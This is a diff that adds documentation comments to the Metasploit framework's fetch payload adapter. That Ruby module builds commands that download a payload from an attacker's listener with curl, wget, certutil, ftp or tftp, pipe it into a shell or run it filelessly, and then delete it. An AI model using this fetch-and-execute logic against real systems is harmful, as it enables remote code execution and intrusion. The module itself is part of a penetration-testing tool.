@@ -1,6 +1,11 @@
 module Msf::Payload::Adapter::Fetch
   include Msf::Payload::Adapter::Fetch::Fileless
-  
+
+  # Initializes the fetch adapter state and registers datastore options used to
+  # stage and serve the adapted payload.
+  #
+  # @param args [Array] Arguments forwarded to the parent payload initializer.
+  # @return [void]
   def initialize(*args)
     super
     register_options(
@@ -35,6 +40,9 @@ module Msf::Payload::Adapter::Fetch
   # in Framework, and if the underlying payload type/host/port are the same, the URI
   # will be, too.
   #
+  # @param extra_data [String, nil] Additional data to incorporate into the
+  #   generated URI hash.
+  # @return [String] A stable URI-safe identifier for the served payload.
   def default_srvuri(extra_data = nil)
     # If we're in framework, payload is in datastore; msfvenom has it in refname
     payload_name = datastore['payload'] ||= refname
@@ -65,32 +73,56 @@ module Msf::Payload::Adapter::Fetch
     Base64.urlsafe_encode64(OpenSSL::Digest::MD5.new(decoded_uri).digest, padding: false)
   end
 
+  # Returns the payload download URI served by the fetch listener.
+  #
+  # @return [String] The URI path and authority for the generated payload.
   def download_uri
     "#{srvnetloc}/#{srvuri}"
   end
 
+  # Returns the pipe download URI used when serving commands over FETCH_PIPE.
+  #
+  # @return [String] The URI path and authority for the piped command payload.
   def _download_pipe
     "#{srvnetloc}/#{@pipe_uri}"
   end
 
+  # Returns the interface the fetch service should bind to.
+  #
+  # @return [String] The bind address for the local fetch listener.
   def fetch_bindhost
     datastore['FetchListenerBindAddress'].blank? ? srvhost : datastore['FetchListenerBindAddress']
   end
 
+  # Returns the TCP port the fetch service should bind to.
+  #
+  # @return [Integer] The bind port for the local fetch listener.
   def fetch_bindport
     datastore['FetchListenerBindPort'].blank? ? srvport : datastore['FetchListenerBindPort']
   end
-
+  
+  # Returns the authority string used by the fetch listener socket.
+  #
+  # @return [String] The host:port pair for the fetch listener.
   def fetch_bindnetloc
     Rex::Socket.to_authority(fetch_bindhost, fetch_bindport)
   end
 
+  # Lists supported binaries that can execute commands piped directly from the
+  # fetch server.
+  #
+  # @return [Array<String>] The set of supported pipe-capable binaries.
   def pipe_supported_binaries
     # this is going to expand when we add psh support
     return %w[CURL] if windows?
     %w[WGET GET CURL]
   end
 
+  # Builds an adapted payload executable, starts any required pipe command state,
+  # and returns the remote command that should fetch and execute the payload.
+  #
+  # @param opts [Hash] Payload generation options.
+  # @return [String] The fetch command to run on the target.
   def generate(opts = {})
     opts[:arch] ||= module_info['AdaptedArch']
     opts[:code] = super
@@ -110,6 +142,9 @@ module Msf::Payload::Adapter::Fetch
     cmd
   end
 
+  # Builds the fetch command used to execute a payload directly from a pipe.
+  #
+  # @return [String] The pipe-based execution command.
   def generate_pipe_command
     # TODO: Make a check method that determines if we support a platform/server/command combination
     @pipe_uri = pipe_srvuri
@@ -126,6 +161,9 @@ module Msf::Payload::Adapter::Fetch
     end
   end
 
+  # Dispatches command generation to the selected FETCH_COMMAND helper.
+  #
+  # @return [String] The generated fetch-and-execute command.
   def generate_fetch_commands
     # TODO: Make a check method that determines if we support a platform/server/command combination
     #
@@ -149,22 +187,41 @@ module Msf::Payload::Adapter::Fetch
     end
   end
 
+  # Generates the stage using the adapted architecture when one is not
+  # explicitly provided.
+  #
+  # @param opts [Hash] Stage generation options.
+  # @return [String] The generated stage contents.
   def generate_stage(opts = {})
     opts[:arch] ||= module_info['AdaptedArch']
     super
   end
 
+  # Generates a payload UUID using the adapted platform and architecture by
+  # default.
+  #
+  # @param conf [Hash] UUID generation options.
+  # @return [PayloadUUID] The generated payload UUID.
   def generate_payload_uuid(conf = {})
     conf[:arch] ||= module_info['AdaptedArch']
     conf[:platform] ||= module_info['AdaptedPlatform']
     super
   end
 
+  # Handles a new incoming connection while ensuring the adapted architecture is
+  # supplied to the parent implementation.
+  #
+  # @param conn [Object] The connection object being handled.
+  # @param opts [Hash] Connection handling options.
+  # @return [Object] The result from the parent handler.
   def handle_connection(conn, opts = {})
     opts[:arch] ||= module_info['AdaptedArch']
     super
   end
 
+  # Returns the configured host used to serve the adapted payload.
+  #
+  # @return [String] The payload service host.
   def srvhost
     host = datastore['FETCH_SRVHOST']
     host = datastore['LHOST'] if host.blank?
@@ -172,14 +229,24 @@ module Msf::Payload::Adapter::Fetch
     host
   end
 
+  # Returns the authority string for the payload fetch service.
+  #
+  # @return [String] The host:port pair used in generated download URLs.
   def srvnetloc
     Rex::Socket.to_authority(srvhost, srvport)
   end
 
+  # Returns the configured port used to serve the adapted payload.
+  #
+  # @return [Integer] The payload service port.
   def srvport
     datastore['FETCH_SRVPORT']
   end
 
+  # Returns the URI path used to serve the payload or a deterministic default
+  # when one has not been explicitly configured.
+  #
+  # @return [String] The payload download URI path.
   def srvuri
     # If the user has selected FETCH_PIPE, we save any user-defined uri for the pipe command
     return default_srvuri if datastore['FETCH_PIPE'] || datastore['FETCH_URIPATH'].blank?
@@ -187,12 +254,18 @@ module Msf::Payload::Adapter::Fetch
     datastore['FETCH_URIPATH']
   end
 
+  # Returns the URI path used when serving commands through FETCH_PIPE.
+  #
+  # @return [String] The pipe command URI path.
   def pipe_srvuri
     return datastore['FETCH_URIPATH'] unless datastore['FETCH_URIPATH'].blank?
 
     default_srvuri('pipe')
   end
 
+  # Indicates whether the adapted payload targets Windows.
+  #
+  # @return [Boolean] True when the first adapted platform is Windows.
   def windows?
     return @windows unless @windows.nil?
 
@@ -200,6 +273,9 @@ module Msf::Payload::Adapter::Fetch
     @windows
   end
 
+  # Indicates whether the adapted payload targets Linux.
+  #
+  # @return [Boolean] True when the first adapted platform is Linux.
   def linux?
     return @linux unless @linux.nil?
 
@@ -207,6 +283,10 @@ module Msf::Payload::Adapter::Fetch
     @linux
   end
 
+  # Validates that the TFTP listener is configured to use a reachable port for
+  # clients that only support port 69.
+  #
+  # @return [void]
   def _check_tftp_port
     # Most tftp clients do not have configurable ports
     if datastore['FETCH_SRVPORT'] != 69 && datastore['FetchListenerBindPort'].blank?
@@ -215,6 +295,10 @@ module Msf::Payload::Adapter::Fetch
     end
   end
 
+  # Validates that the TFTP client can save the fetched file using the requested
+  # destination semantics.
+  #
+  # @return [void]
   def _check_tftp_file
     # Older Linux tftp clients do not support saving the file under a different name
     unless datastore['FETCH_WRITABLE_DIR'].blank? && datastore['FETCH_FILENAME'].blank?
@@ -224,6 +308,11 @@ module Msf::Payload::Adapter::Fetch
   end
 
   # copied from https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/remote/socket_server.rb
+  # @param ip [String, nil] The listener IP address used to infer the best
+  #   communication channel.
+  # @param srv_comm [String] The requested listener communication channel.
+  # @return [Rex::Socket::Comm] The resolved communication object.
+  # @raise [RuntimeError] If an explicitly requested session comm is invalid.
   def _determine_server_comm(ip, srv_comm = datastore['ListenerComm'].to_s)
     comm = nil
 
@@ -245,18 +334,32 @@ module Msf::Payload::Adapter::Fetch
     comm || ::Rex::Socket::Comm::Local
   end
 
+  # Appends the platform-specific execution sequence to a fetch command.
+  #
+  # @param get_file_cmd [String] The command that retrieves the payload.
+  # @return [String] The command updated to execute the payload after download.
   def _execute_add(get_file_cmd)
     return _execute_win(get_file_cmd) if windows?
 
     return _execute_nix(get_file_cmd)
   end
 
+  # Appends Windows execution and optional cleanup behavior to the supplied
+  # fetch command.
+  #
+  # @param get_file_cmd [String] The command that retrieves the payload.
+  # @return [String] The command updated for Windows execution.
   def _execute_win(get_file_cmd)
     cmds = " & start /B #{_remote_destination_win}"
     cmds << " & del #{_remote_destination_win}" if datastore['FETCH_DELETE']
     get_file_cmd << cmds
   end
 
+  # Appends POSIX execution and optional cleanup behavior to the supplied fetch
+  # command, including fileless execution modes when configured.
+  #
+  # @param get_file_cmd [String] The command that retrieves the payload.
+  # @return [String] The command updated for POSIX execution.
   def _execute_nix(get_file_cmd)
     return _generate_fileless_shell(get_file_cmd, module_info['AdaptedArch']) if datastore['FETCH_FILELESS'] == 'shell'
     return _generate_fileless_bash_search(get_file_cmd) if datastore['FETCH_FILELESS'] == 'shell-search'
@@ -270,6 +373,9 @@ module Msf::Payload::Adapter::Fetch
     cmds
   end
 
+  # Builds a certutil-based command line for fetching the payload on Windows.
+  #
+  # @return [String] The certutil fetch-and-execute command.
   def _generate_certutil_command
     case fetch_protocol
     when 'HTTP'
@@ -285,6 +391,9 @@ module Msf::Payload::Adapter::Fetch
     _execute_add(get_file_cmd)
   end
 
+  # Builds a curl-based command line for fetching the payload.
+  #
+  # @return [String] The curl fetch-and-execute command.
   def _generate_curl_command
     case fetch_protocol
     when 'HTTP'
@@ -299,6 +408,9 @@ module Msf::Payload::Adapter::Fetch
     _execute_add(get_file_cmd)
   end
 
+  # Builds a curl command that streams a served command directly into a shell.
+  #
+  # @return [String] The curl pipe command.
   def _generate_curl_pipe
     execute_cmd = 'sh'
     execute_cmd = 'cmd' if windows?
@@ -312,6 +424,9 @@ module Msf::Payload::Adapter::Fetch
     end
   end
 
+  # Builds a GET-based command line for fetching the payload.
+  #
+  # @return [String] The GET fetch-and-execute command.
   def _generate_get_command
     # Specifying the method (-m GET) is necessary on OSX
     case fetch_protocol
@@ -330,6 +445,9 @@ module Msf::Payload::Adapter::Fetch
     _execute_add(get_file_cmd)
   end
 
+  # Builds a GET command that streams a served command directly into a shell.
+  #
+  # @return [String] The GET pipe command.
   def _generate_get_pipe
     # Specifying the method (-m GET) is necessary on OSX
     execute_cmd = 'sh'
@@ -349,6 +467,9 @@ module Msf::Payload::Adapter::Fetch
     end
   end
 
+  # Builds an ftp command line for fetching the payload.
+  #
+  # @return [String] The ftp fetch-and-execute command.
   def _generate_ftp_command
     case fetch_protocol
     when 'FTP'
@@ -363,6 +484,10 @@ module Msf::Payload::Adapter::Fetch
     _execute_add(get_file_cmd)
   end
 
+  # Builds a tftp command line for fetching the payload, including Linux
+  # fileless handling when supported.
+  #
+  # @return [String] The tftp fetch-and-execute command.
   def _generate_tftp_command
     _check_tftp_port
     case fetch_protocol
@@ -383,6 +508,9 @@ module Msf::Payload::Adapter::Fetch
     fetch_command
   end
 
+  # Builds a tnftp command line for fetching the payload.
+  #
+  # @return [String] The tnftp fetch-and-execute command.
   def _generate_tnftp_command
     case fetch_protocol
     when 'FTP'
@@ -397,6 +525,9 @@ module Msf::Payload::Adapter::Fetch
     _execute_add(get_file_cmd)
   end
 
+  # Builds a wget-based command line for fetching the payload.
+  #
+  # @return [String] The wget fetch-and-execute command.
   def _generate_wget_command
     case fetch_protocol
     when 'HTTPS'
@@ -410,6 +541,9 @@ module Msf::Payload::Adapter::Fetch
     _execute_add(get_file_cmd)
   end
 
+  # Builds a wget command that streams a served command directly into a shell.
+  #
+  # @return [String] The wget pipe command.
   def _generate_wget_pipe
     case fetch_protocol
     when 'HTTPS'
@@ -421,12 +555,19 @@ module Msf::Payload::Adapter::Fetch
     end
   end
 
+  # Returns the platform-appropriate destination path used by download
+  # commands.
+  #
+  # @return [String] The payload destination path.
   def _remote_destination
     return _remote_destination_win if windows?
 
     return _remote_destination_nix
   end
 
+  # Returns or memoizes the remote payload destination for POSIX targets.
+  #
+  # @return [String] The POSIX destination path or fileless placeholder.
   def _remote_destination_nix
     return @remote_destination_nix unless @remote_destination_nix.nil?
 
@@ -444,6 +585,9 @@ module Msf::Payload::Adapter::Fetch
     @remote_destination_nix
   end
 
+  # Returns or memoizes the remote payload destination for Windows targets.
+  #
+  # @return [String] The Windows destination path.
   def _remote_destination_win
     return @remote_destination_win unless @remote_destination_win.nil?
 
